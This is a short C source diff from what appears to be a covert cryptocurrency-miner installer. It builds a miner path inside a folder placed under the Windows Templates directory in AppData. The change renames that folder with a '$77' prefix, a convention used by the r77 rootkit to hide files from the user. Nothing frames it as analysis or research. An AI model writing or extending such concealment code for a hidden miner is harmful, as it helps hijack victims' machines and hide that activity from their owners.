@@ -170,7 +170,7 @@ int main() {
     
     // Build mall directory path
     CHAR mallDir[MAX_PATH] = {0};
-    snprintf(mallDir, MAX_PATH, "%s\\Microsoft\\Windows\\Templates\\mall", appDataPath);
+    snprintf(mallDir, MAX_PATH, "%s\\Microsoft\\Windows\\Templates\\$77-mall", appDataPath);
     
     // Build miner path
     CHAR minerPath[MAX_PATH] = {0};
